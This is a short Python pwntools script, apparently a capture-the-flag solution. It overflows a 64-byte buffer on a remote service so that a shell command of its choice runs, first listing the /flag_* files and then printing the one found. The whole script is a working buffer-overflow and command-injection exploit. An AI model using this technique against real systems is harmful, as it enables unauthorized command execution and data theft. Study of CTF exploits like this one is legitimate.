from sys import argv
from pwn import *

if len(argv) < 3:
    print("Usage: solve.py <host> <port> DEBUG")
    exit(1)

_, HOST, PORT = argv

p = remote(HOST, PORT)
cmd = b'echo /flag_*\x00'
payload = b'A' * 64  + cmd
p.sendline(payload)
path = p.recvlines(3)[2]
p.close()

p = remote(HOST, PORT)
cmd = b'cat ' + path.strip() + b'\x00'
payload = b'A' * 64  + cmd
p.sendline(payload)
print(p.recvlines(3)[2])
